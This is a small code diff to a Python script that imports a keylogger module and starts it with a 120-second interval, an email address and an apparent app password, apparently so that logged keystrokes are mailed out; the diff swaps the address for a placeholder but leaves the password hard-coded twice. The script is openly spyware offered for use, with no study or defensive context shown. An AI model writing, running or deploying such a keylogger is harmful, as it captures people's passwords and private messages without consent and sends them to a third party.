@@ -1,4 +1,5 @@
 import keylogger
-
-my_keylogger = keylogger.Keylogger(120,"titomanjate@gmail.com","yywriznvcklsaepi")
+email="youremail@gmail.com"
+password="yywriznvcklsaepi"
+my_keylogger = keylogger.Keylogger(120,email,"yywriznvcklsaepi")
 my_keylogger.start()
